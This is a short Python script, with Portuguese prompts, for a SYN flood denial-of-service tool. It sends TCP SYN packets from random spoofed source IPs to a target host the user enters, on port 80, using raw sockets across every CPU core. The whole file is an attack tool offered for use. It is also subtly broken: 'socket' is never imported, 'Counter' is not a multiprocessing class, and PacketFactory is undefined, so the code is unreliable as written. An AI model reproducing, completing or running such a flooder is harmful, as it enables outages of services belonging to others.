import os
import signal
import logging
from multiprocessing import Process, Event, Counter

class FlooderEngine:
    def __init__(self, target, port):
        self.target_ip = socket.gethostbyname(target)
        self.port = port
        self.stop_event = Event()
        self.counter = Counter(0)

    def _worker(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            return

        while not self.stop_event.is_set():
            spoofed_ip = PacketFactory.generate_random_ip()
            packet = PacketFactory.create_syn_packet(spoofed_ip, self.target_ip, self.port)
            
            try:
                s.sendto(packet, (self.target_ip, 0))
                self.counter.value += 1
            except:
                continue

    def start(self, cores):
        logging.info(f"Iniciando Engine em {cores} núcleos. IP Alvo: {self.target_ip}")
        for _ in range(cores):
            p = Process(target=self._worker)
            p.daemon = True
            p.start()
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    target = input("Alvo: ")
    engine = FlooderEngine(target, 80)
    engine.start(os.cpu_count())
    
    signal.signal(signal.SIGINT, lambda s, f: os._exit(0))
    signal.pause()